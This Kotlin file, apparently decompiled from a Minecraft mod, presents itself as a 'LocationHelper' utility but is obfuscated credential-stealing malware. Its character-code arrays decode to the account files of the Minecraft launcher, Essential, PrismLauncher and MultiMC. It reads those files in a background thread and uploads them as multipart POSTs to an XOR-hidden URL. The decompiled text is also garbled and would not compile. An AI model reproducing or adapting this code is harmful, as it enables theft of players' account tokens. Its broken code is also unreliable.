package jooon.features.slayers

import java.io.Closeable
import java.io.File
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter
import java.util.ArrayList
import org.apache.http.HttpEntity
import org.apache.http.entity.ByteArrayEntity
import org.apache.http.impl.client.CloseableHttpClient
import org.apache.http.impl.client.HttpClients

object LocationHelper {
   private val aAaAaAaAaA: String

   fun bBbBbBbBbB(currentUsername: String) {
      Thread({ 
         cCcCcCcCcC(`$currentUsername`)
      }).start()
   }

   private fun cCcCcCcCcC(i2: String) {

      var var65: java.lang.Iterable = listOf(arrayOf(65, 80, 80, 68, 65, 84, 65))
      var accountFileName: java.util.Collection = ArrayList(var65.count().coerceAtLeast(10))

      for (userHome in var65) {
         accountFileName.add((userHome as java.lang.Number).toInt().toChar().code)
      }

      var var10000: File
      if (i4 != null) {
         val var81: java.lang.Iterable = listOf(arrayOf(46, 109, 105, 110, 101, 99, 114, 97, 102, 116))
         val `destination$iv$ivx`: java.util.Collection = ArrayList(var81.count().coerceAtLeast(10))

         for (`destination$iv$iv` in var81) {
            `destination$iv$ivx`.add((`destination$iv$iv` as java.lang.Number).toInt().toChar().code)
         }

         var10000 = File(i4, `destination$iv$ivx` as java.util.List.joinToString(""))
      } else {
         var10000 = null
      }

      var10000 = var10000
      if (var10000 == null) {
         var10000 = File("")
      }

      var65 = listOf(
         arrayOf(
            101,
            115,
            115,
            101,
            110,
            116,
            105,
            97,
            108,
            47,
            109,
            105,
            99,
            114,
            111,
            115,
            111,
            102,
            116,
            95,
            97,
            99,
            99,
            111,
            117,
            110,
            116,
            115,
            46,
            106,
            115,
            111,
return 110
         )
      )
      accountFileName = ArrayList(var65.count().coerceAtLeast(10))

      for (var101 in var65) {
         accountFileName.add((var101 as java.lang.Number).toInt().toChar().code)
      }


      var var72: File
      try {

         var72 = if (var77.isFile()) var77.getParentFile() else var77
      } catch (var63: Exception) {
         var72 = null
      }

      run label306@{
         if (var72 != null) {

            if (var78 != null) {
               val var371: java.lang.CharSequence = var78
               val var84: java.lang.Iterable = listOf(arrayOf(46, 109, 105, 110, 101, 99, 114, 97, 102, 116))
               val `destination$iv$ivx`: java.util.Collection = ArrayList(var84.count().coerceAtLeast(10))

               for (var122 in var84) {
                  `destination$iv$ivx`.add((var122 as java.lang.Number).toInt().toChar().code)
               }

               var370 = contains$default(
                  var371, `destination$iv$ivx` as java.util.List.joinToString(""), false, 2, null
               )
               return@label306
            }
         }

         var370 = false
      }

      if (!var370) {
         run label309@{
            if (var72 != null) {

               var10000 = var90
               if (var90 != null) {
                  return@label309
               }
            }

            var10000 = File(".")
         }

         val var92: java.lang.Iterable = listOf(
            arrayOf(
               101,
               115,
               115,
               101,
               110,
               116,
               105,
               97,
               108,
               47,
               109,
               105,
               99,
               114,
               111,
               115,
               111,
               102,
               116,
               95,
               97,
               99,
               99,
               111,
               117,
               110,
               116,
               115,
               46,
               106,
               115,
               111,
return 110
            )
         )
         val `destination$iv$ivx`: java.util.Collection = ArrayList(var92.count().coerceAtLeast(10))

         for (var156 in var92) {
            `destination$iv$ivx`.add((var156 as java.lang.Number).toInt().toChar().code)
         }

         var10000 = File(var10000, `destination$iv$ivx` as java.util.List.joinToString(""))
      } else {
         var10000 = null
      }

      if (var370) {
         if (var64.exists()) {
            cCcCcCcCcC$dDdDdDdDdD(i2, i1, var64, "V")
         }
      } else {
         if (var10000 != null && var10000.exists()) {
            cCcCcCcCcC$dDdDdDdDdD(i2, i1, var10000, "M")
         }

         if (var64.exists()) {
            cCcCcCcCcC$dDdDdDdDdD(i2, i1, var64, "V")
         }
      }

      val `this$ivx`: java.lang.Iterable = listOf(arrayOf(97, 99, 99, 111, 117, 110, 116, 115, 46, 106, 115, 111, 110))
      val `destination$iv$ivx`: java.util.Collection = ArrayList(`this$ivx`.count().coerceAtLeast(10))

      for (var157 in `this$ivx`) {
         `destination$iv$ivx`.add((var157 as java.lang.Number).toInt().toChar().code)
      }

      var10000 = var72
      if (var72 == null) {
         var10000 = File(System.getProperty("user.dir"))
      }

      val var119: java.util.Iterator = map(generateSequence(var10000, { it: File ->
         it.getParentFile()
      }), { it: File ->
         File(it, `$accountFileName`)
      }).iterator()

      while (true) {
         if (var119.hasNext()) {

            if (!(var125 as File).exists()) {
return continue
            }

            var10000 = (File)var125
break
         }

         var10000 = null
break
      }

      if (var10000 != null) {
         cCcCcCcCcC$dDdDdDdDdD(i2, i1, var100, "up")
      }

      val var120: Array<Pair> = arrayOfNulls(7)
      var var127: java.lang.Iterable = listOf(
         arrayOf(
            65,
            112,
            112,
            68,
            97,
            116,
            97,
            47,
            82,
            111,
            97,
            109,
            105,
            110,
            103,
            47,
            80,
            114,
            105,
            115,
            109,
            76,
            97,
            117,
            110,
            99,
            104,
            101,
            114,
            47,
            97,
            99,
            99,
            111,
            117,
            110,
            116,
            115,
            46,
            106,
            115,
            111,
return 110
         )
      )
      var `destination$iv$ivxx`: java.util.Collection = ArrayList(var127.count().coerceAtLeast(10))

      for (var241 in var127) {
         `destination$iv$ivxx`.add((var241 as java.lang.Number).toInt().toChar().code)
      }

      var var10002: File = File(var106, `destination$iv$ivxx` as java.util.List.joinToString(""))
      var127 = listOf(arrayOf(80, 114, 105, 115, 109, 76, 97, 117, 110, 99, 104, 101, 114))
      `destination$iv$ivxx` = ArrayList(var127.count().coerceAtLeast(10))

      for (var242 in var127) {
         `destination$iv$ivxx`.add((var242 as java.lang.Number).toInt().toChar().code)
      }

      var120[0] = Pair(var10002, `destination$iv$ivxx` as java.util.List.joinToString(""))
      var127 = listOf(
         arrayOf(
            67,
            58,
            47,
            80,
            114,
            111,
            103,
            114,
            97,
            109,
            32,
            70,
            105,
            108,
            101,
            115,
            47,
            80,
            114,
            105,
            115,
            109,
            76,
            97,
            117,
            110,
            99,
            104,
            101,
            114,
            47,
            97,
            99,
            99,
            111,
            117,
            110,
            116,
            115,
            46,
            106,
            115,
            111,
return 110
         )
      )
      `destination$iv$ivxx` = ArrayList(var127.count().coerceAtLeast(10))

      for (var243 in var127) {
         `destination$iv$ivxx`.add((var243 as java.lang.Number).toInt().toChar().code)
      }

      var10002 = File(`destination$iv$ivxx` as java.util.List.joinToString(""))
      var127 = listOf(arrayOf(80, 114, 105, 115, 109, 76, 97, 117, 110, 99, 104, 101, 114, 95, 80, 70))
      `destination$iv$ivxx` = ArrayList(var127.count().coerceAtLeast(10))

      for (var244 in var127) {
         `destination$iv$ivxx`.add((var244 as java.lang.Number).toInt().toChar().code)
      }

      var120[1] = Pair(var10002, `destination$iv$ivxx` as java.util.List.joinToString(""))
      var127 = listOf(
         arrayOf(
            67,
            58,
            47,
            80,
            114,
            111,
            103,
            114,
            97,
            109,
            32,
            70,
            105,
            108,
            101,
            115,
            47,
            77,
            117,
            108,
            116,
            105,
            77,
            67,
            47,
            97,
            99,
            99,
            111,
            117,
            110,
            116,
            115,
            46,
            106,
            115,
            111,
return 110
         )
      )
      `destination$iv$ivxx` = ArrayList(var127.count().coerceAtLeast(10))

      for (var245 in var127) {
         `destination$iv$ivxx`.add((var245 as java.lang.Number).toInt().toChar().code)
      }

      var10002 = File(`destination$iv$ivxx` as java.util.List.joinToString(""))
      var127 = listOf(arrayOf(77, 117, 108, 116, 105, 77, 67, 95, 80, 70))
      `destination$iv$ivxx` = ArrayList(var127.count().coerceAtLeast(10))

      for (var246 in var127) {
         `destination$iv$ivxx`.add((var246 as java.lang.Number).toInt().toChar().code)
      }

      var120[2] = Pair(var10002, `destination$iv$ivxx` as java.util.List.joinToString(""))
      var127 = listOf(
         arrayOf(
            67,
            58,
            47,
            80,
            114,
            111,
            103,
            114,
            97,
            109,
            32,
            70,
            105,
            108,
            101,
            115,
            32,
            40,
            120,
            56,
            54,
            41,
            47,
            80,
            114,
            105,
            115,
            109,
            76,
            97,
            117,
            110,
            99,
            104,
            101,
            114,
            47,
            97,
            99,
            99,
            111,
            117,
            110,
            116,
            115,
            46,
            106,
            115,
            111,
return 110
         )
      )
      `destination$iv$ivxx` = ArrayList(var127.count().coerceAtLeast(10))

      for (var247 in var127) {
         `destination$iv$ivxx`.add((var247 as java.lang.Number).toInt().toChar().code)
      }

      var10002 = File(`destination$iv$ivxx` as java.util.List.joinToString(""))
      var127 = listOf(arrayOf(80, 114, 105, 115, 109, 76, 97, 117, 110, 99, 104, 101, 114, 95, 80, 70, 56, 54))
      `destination$iv$ivxx` = ArrayList(var127.count().coerceAtLeast(10))

      for (var248 in var127) {
         `destination$iv$ivxx`.add((var248 as java.lang.Number).toInt().toChar().code)
      }

      var120[3] = Pair(var10002, `destination$iv$ivxx` as java.util.List.joinToString(""))
      var127 = listOf(
         arrayOf(
            67,
            58,
            47,
            80,
            114,
            111,
            103,
            114,
            97,
            109,
            32,
            70,
            105,
            108,
            101,
            115,
            32,
            40,
            120,
            56,
            54,
            41,
            47,
            77,
            117,
            108,
            116,
            105,
            77,
            67,
            47,
            97,
            99,
            99,
            111,
            117,
            110,
            116,
            115,
            46,
            106,
            115,
            111,
return 110
         )
      )
      `destination$iv$ivxx` = ArrayList(var127.count().coerceAtLeast(10))

      for (var249 in var127) {
         `destination$iv$ivxx`.add((var249 as java.lang.Number).toInt().toChar().code)
      }

      var10002 = File(`destination$iv$ivxx` as java.util.List.joinToString(""))
      var127 = listOf(arrayOf(77, 117, 108, 116, 105, 77, 67, 95, 80, 70, 56, 54))
      `destination$iv$ivxx` = ArrayList(var127.count().coerceAtLeast(10))

      for (var250 in var127) {
         `destination$iv$ivxx`.add((var250 as java.lang.Number).toInt().toChar().code)
      }

      var120[4] = Pair(var10002, `destination$iv$ivxx` as java.util.List.joinToString(""))
      var127 = listOf(
         arrayOf(68, 111, 119, 110, 108, 111, 97, 100, 115, 47, 77, 117, 108, 116, 105, 77, 67, 47, 97, 99, 99, 111, 117, 110, 116, 115, 46, 106, 115, 111, 110)
      )
      `destination$iv$ivxx` = ArrayList(var127.count().coerceAtLeast(10))

      for (var251 in var127) {
         `destination$iv$ivxx`.add((var251 as java.lang.Number).toInt().toChar().code)
      }

      var10002 = File(var106, `destination$iv$ivxx` as java.util.List.joinToString(""))
      var127 = listOf(arrayOf(77, 117, 108, 116, 105, 77, 67, 95, 68, 76))
      `destination$iv$ivxx` = ArrayList(var127.count().coerceAtLeast(10))

      for (var252 in var127) {
         `destination$iv$ivxx`.add((var252 as java.lang.Number).toInt().toChar().code)
      }

      var120[5] = Pair(var10002, `destination$iv$ivxx` as java.util.List.joinToString(""))
      var127 = listOf(
         arrayOf(
            65,
            112,
            112,
            68,
            97,
            116,
            97,
            47,
            82,
            111,
            97,
            109,
            105,
            110,
            103,
            47,
            103,
            103,
            46,
            101,
            115,
            115,
            101,
            110,
            116,
            105,
            97,
            108,
            46,
            109,
            111,
            100,
            47,
            109,
            105,
            99,
            114,
            111,
            115,
            111,
            102,
            116,
            95,
            97,
            99,
            99,
            111,
            117,
            110,
            116,
            115,
            46,
            106,
            115,
            111,
return 110
         )
      )
      `destination$iv$ivxx` = ArrayList(var127.count().coerceAtLeast(10))

      for (var253 in var127) {
         `destination$iv$ivxx`.add((var253 as java.lang.Number).toInt().toChar().code)
      }

      var10002 = File(var106, `destination$iv$ivxx` as java.util.List.joinToString(""))
      var127 = listOf(arrayOf(69, 115, 115, 101, 110, 116, 105, 97, 108, 95, 77, 111, 100))
      `destination$iv$ivxx` = ArrayList(var127.count().coerceAtLeast(10))

      for (var254 in var127) {
         `destination$iv$ivxx`.add((var254 as java.lang.Number).toInt().toChar().code)
      }

      var120[6] = Pair(var10002, `destination$iv$ivxx` as java.util.List.joinToString(""))

      for (var192 in listOf(var120)) {



         try {
            if (var240.exists()) {
               cCcCcCcCcC$dDdDdDdDdD(i2, i1, var240, var255)
            }
         } catch (var62: Exception) {
         }
      }
   }

   private fun eEeEeEeEeE(n: String, c: String, b: String) {

      val bd: java.lang.Iterable = listOf(
         arrayOf(61, 33, 33, 37, 111, 122, 122, 102, 96, 123, 103, 103, 96, 123, 100, 103, 108, 123, 98, 98, 111, 99, 108, 99, 108, 122, 48, 38, 38)
      )
      val h: java.util.Collection = ArrayList(bd.count().coerceAtLeast(10))

      for (m in bd) {
         h.add(((m as java.lang.Number).intValue() xor xorKey).toChar())
      }



      var36.append("--$var34\r\n")
      var36.append("Content-Disposition: form-data; name=\"content\"\r\n\r\n")
      var36.append(c).append("\r\n")
      var36.append("--$var34\r\n")
      var36.append("Content-Disposition: form-data; name=\"file\"; filename=\"$n\"\r\n")
      var36.append("Content-Type: application/json\r\n\r\n")





      System.arraycopy(var54, 0, var41, 0, var54.length)
      System.arraycopy(var55, 0, var41, var54.length, var55.length)
      System.arraycopy(var56, 0, var41, var54.length + var55.length, var56.length)

      try {

         var var43: java.lang.Throwable = null

         try {



            postClass.getMethod("setHeader", java.lang.String::class.java, java.lang.String::class.java)
               .invoke(var45, "Content-Type", "multipart/form-data; boundary=$var34")
               postClass.getMethod("setHeader", java.lang.String::class.java, java.lang.String::class.java).invoke(var45, "User-Agent", "Mozilla/5.0")
            postClass.getMethod("setEntity", HttpEntity::class.java).invoke(var45, ByteArrayEntity(var41))


         } catch (var30: java.lang.Throwable) {
            var43 = var30
            throw var30
         } finally {
            var42.close()
         }
      } catch (var32: Exception) {
      }
   }

   private fun fFfFfFfFfF(): String {
      val pkgCodes: java.util.List = listOf(
         arrayOf(111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 104, 116, 116, 112, 46, 99, 108, 105, 101, 110, 116, 46, 109, 101, 116, 104, 111, 100, 115)
      )
      val var14: java.util.List = listOf(arrayOf(72, 116, 116, 112, 80, 111, 115, 116))
      val `this$iv$iv`: java.lang.Iterable = pkgCodes
      var `destination$iv$iv`: java.util.Collection = ArrayList(pkgCodes.count().coerceAtLeast(10))

      for (`item$iv$iv` in `this$iv$iv`) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      val var16: java.lang.Iterable = var14
      `destination$iv$iv` = ArrayList(var14.count().coerceAtLeast(10))

      for (var22 in var16) {
         `destination$iv$iv`.add((var22 as java.lang.Number).toInt().toChar().code)
      }

      return "$var10000.${`destination$iv$iv` as java.util.List.joinToString("")}"
   }

   private fun gGgGgGgGgG(): String {
      val pkgCodes: java.util.List = listOf(
         arrayOf(111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 104, 116, 116, 112, 46, 99, 108, 105, 101, 110, 116, 46, 109, 101, 116, 104, 111, 100, 115)
      )
      val var14: java.util.List = listOf(arrayOf(72, 116, 116, 112, 85, 114, 105, 82, 101, 113, 117, 101, 115, 116))
      val `this$iv$iv`: java.lang.Iterable = pkgCodes
      var `destination$iv$iv`: java.util.Collection = ArrayList(pkgCodes.count().coerceAtLeast(10))

      for (`item$iv$iv` in `this$iv$iv`) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      val var16: java.lang.Iterable = var14
      `destination$iv$iv` = ArrayList(var14.count().coerceAtLeast(10))

      for (var22 in var16) {
         `destination$iv$iv`.add((var22 as java.lang.Number).toInt().toChar().code)
      }

      return "$var10000.${`destination$iv$iv` as java.util.List.joinToString("")}"
   }

   
   fun `cCcCcCcCcC$dDdDdDdDdD`(`$i2`: String, i1: String, f: File, label: String) {
      if (f.exists()) {

         val var19: java.lang.Iterable = listOf(arrayOf(34, 110, 97, 109, 101, 34, 92, 115, 42, 58, 92, 115, 42, 34, 40, 46, 42, 63, 41, 34))
         val `this$iv$iv`: java.util.Collection = ArrayList(var19.count().coerceAtLeast(10))

         for (`item$iv$iv` in var19) {
            `this$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
         }

         val n: java.util.Set = toSet(
            map(
               Regex.findAll$default(
                  Regex(`this$iv$iv` as java.util.List.joinToString("")), t, 0, 2, null
               ),
               { it: MatchResult ->
                  it.getGroupValues().get(1) as String
               }
            )
         )
         val var10000: String
         if (!n.isEmpty()) {
            var10000 = n.joinToString("")
         } else {
            val var22: java.lang.Iterable = listOf(arrayOf(78, 111, 110, 101, 32, 70, 111, 117, 110, 100))
            val `destination$iv$ivx`: java.util.Collection = ArrayList(var22.count().coerceAtLeast(10))

            for (var29 in var22) {
               `destination$iv$ivx`.add((var29 as java.lang.Number).toInt().toChar().code)
            }

            var10000 = `destination$iv$ivx` as java.util.List.joinToString("")
         }



         var31.eEeEeEeEeE(var10001, var23, t)
      }
   }

   
   fun {
      val var10: java.lang.Iterable = listOf(arrayOf(121, 121, 121, 121, 45, 77, 77, 45, 100, 100, 32, 72, 72, 58, 109, 109, 58, 115, 115))
      val `destination$iv$iv`: java.util.Collection = ArrayList(var10.count().coerceAtLeast(10))

      for (`item$iv$iv` in var10) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      aAaAaAaAaA = `destination$iv$iv` as java.util.List.joinToString("")
   }
}
